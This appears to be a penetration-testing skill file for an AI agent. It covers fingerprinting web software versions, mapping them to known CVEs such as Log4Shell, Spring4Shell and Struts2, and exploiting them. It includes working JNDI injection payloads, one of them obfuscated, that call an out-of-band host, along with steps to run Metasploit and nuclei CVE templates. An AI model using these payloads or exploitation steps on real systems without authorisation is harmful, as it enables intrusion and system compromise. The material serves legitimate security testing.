---
name: vulnerable-components
description: Detecting and exploiting known CVEs in outdated or vulnerable software components — libraries, frameworks, servers, and dependencies
---

# Vulnerable and Outdated Components

Every banner, version string, error page, and HTTP header is a fingerprint. Map detected software versions to known CVEs, prioritize exploitable ones, then validate impact. The CVE knowledge base is your primary reference — query it with detected technology + version.

## Attack Surface

**Server & Infrastructure**
- Web server version (`Server: Apache/2.4.49`, `nginx/1.14.0`)
- Application server (Tomcat, JBoss, GlassFish, WebLogic, WebSphere)
- Database server (MySQL 5.x, PostgreSQL 9.x, MongoDB 3.x)
- OS-level packages from error pages or verbose banners

**Framework & Library Fingerprinting**
- HTTP response headers: `X-Powered-By`, `X-AspNet-Version`, `X-Runtime`
- HTML comments, meta tags (`<meta name="generator">`)
- JavaScript filenames and bundles (`jquery-1.11.3.min.js`, `struts2-rest-showcase`)
- Python/Ruby/Node package names in error traces
- Cookie names (`JSESSIONID` → Java, `PHPSESSID` → PHP, `laravel_session` → Laravel)

**CMS & Platforms**
- WordPress: `/wp-login.php`, `?ver=X.X` in asset URLs, readme.html
- Drupal: `CHANGELOG.txt`, `/core/CHANGELOG.txt`, generator meta tag
- Joomla: `/administrator/`, `?option=com_` params
- Magento, OpenCart, Prestashop, TYPO3 — each has version disclosure paths

**JavaScript Dependencies**
- Inline CDN URLs with version: `jquery/3.1.0/jquery.min.js`
- Source maps (`.js.map`) exposing dependency tree
- `package.json` exposed at root → full dependency manifest

**API & Service Components**
- Swagger/OpenAPI spec exposing library versions in `info.version`
- GraphQL introspection revealing framework-specific types
- gRPC reflection exposing service definitions

## Detection Methodology

### Step 1 — Passive Fingerprinting

```
HTTP headers → Server, X-Powered-By, X-Runtime, X-AspNet-Version
Error pages → stack traces, framework names, file paths
HTML source → meta generator, JS file names, CSS class patterns
Robots.txt, sitemap.xml → path structure clues
Cookie names → technology inference
```

### Step 2 — Active Probing

```
/readme.html, /CHANGELOG.txt, /VERSION, /version.txt
/wp-includes/js/jquery/jquery.js (WordPress version embedded)
/misc/drupal.js?v=X (Drupal version)
/RELEASE-NOTES.txt (Tomcat, Apache)
/server-status, /server-info (Apache mod_status)
```

### Step 3 — CVE Lookup

Once version is identified, query the CVE knowledge base:
- Search: `<software> <version> remote code execution`
- Search: `<software> <version> authentication bypass`
- Search: `<software> <version> CVE`
- Cross-reference CVSS score ≥ 7.0 first
- Check for available Metasploit modules or public PoC

### Step 4 — Exploitation

Match detected version against known exploitable CVEs:

**High-Priority CVEs by Category**

| Software | CVE | Type |
|----------|-----|------|
| Apache HTTP 2.4.49-2.4.50 | CVE-2021-41773, CVE-2021-42013 | Path traversal + RCE |
| Log4j 2.x < 2.15 | CVE-2021-44228 (Log4Shell) | JNDI RCE |
| Spring Framework < 5.3.18 | CVE-2022-22965 (Spring4Shell) | RCE |
| Struts2 | CVE-2017-5638, CVE-2018-11776 | RCE |
| Confluence < 7.18.1 | CVE-2022-26134 | OGNL RCE |
| Drupal < 8.5.11 | CVE-2019-6340 | REST deserialization RCE |
| WordPress < 5.x | CVE-2019-8942, CVE-2020-28032 | Auth bypass / RCE |
| PHP-FPM + nginx | CVE-2019-11043 | RCE via path |
| vsftpd 2.3.4 | CVE-2011-2523 | Backdoor shell |
| Samba 3.5.x | CVE-2007-2447 | usermap_script RCE |
| OpenSSL < 1.0.1g | CVE-2014-0160 (Heartbleed) | Memory disclosure |
| Shellshock (bash) | CVE-2014-6271 | RCE via env vars |

## Testing Workflow

1. **Collect all version strings** — headers, errors, HTML, JS files, endpoints
2. **Build technology map** — `{component: version}` for every layer
3. **Query CVE knowledge base** — for each component, search for high/critical CVEs
4. **Prioritize by CVSS + exploitability** — RCE > auth bypass > info disclosure
5. **Validate** — confirm version matches CVE affected range before attempting
6. **Exploit** — use CVE PoC, Metasploit module, or nuclei template
7. **Document** — version detected, CVE ID, CVSS, method of exploitation

## Log4Shell Detection (CVE-2021-44228)

Inject in every user-supplied string that may reach logging:
```
${jndi:ldap://<OAST_HOST>/a}
${${lower:j}ndi:${lower:l}dap://<OAST_HOST>/a}
${jndi:dns://<OAST_HOST>/a}
```
Headers to test: `User-Agent`, `X-Forwarded-For`, `X-Api-Version`, `Referer`, `Authorization`, form fields, JSON values.

## JavaScript Library Detection

```bash
# Check inline jQuery version
grep -r "jQuery v" *.js

# Retire.js patterns
/jquery-(\d+\.\d+\.\d+)(\.min)?\.js
/angular(\.min)?\.js → check angular.version.full
/bootstrap-(\d+\.\d+\.\d+)
```

Known critical JS CVEs:
- jQuery < 3.5.0: CVE-2020-11022 / CVE-2020-11023 (XSS)
- jQuery < 3.0.0: CVE-2019-11358 (prototype pollution)
- Lodash < 4.17.21: CVE-2021-23337 (command injection), CVE-2020-8203 (prototype pollution)
- Moment.js < 2.29.2: CVE-2022-24785 (path traversal)

## Impact

- Remote Code Execution on server via unpatched CVE
- Authentication bypass via known vulnerability
- Data disclosure via memory leak (Heartbleed) or path traversal
- Full system compromise via chained vulnerabilities

## Pro Tips

1. `whatweb`, `wappalyzer`, `nuclei -t technologies/` give instant fingerprints
2. Error pages are gold — deliberately trigger 404/500 to expose framework version
3. Check `/.git/` → `COMMIT_EDITMSG` may reveal deployment timestamp → narrow version range
4. JS source maps expose exact npm package versions from `package.json`
5. Nuclei has CVE templates — run `nuclei -t cves/` against the target for automated coverage
6. Metasploit `auxiliary/scanner/http/http_version` + `auxiliary/scanner/smb/smb_ms17_010` for network-level
7. Always verify version before exploiting — false positives waste time and may harm the target
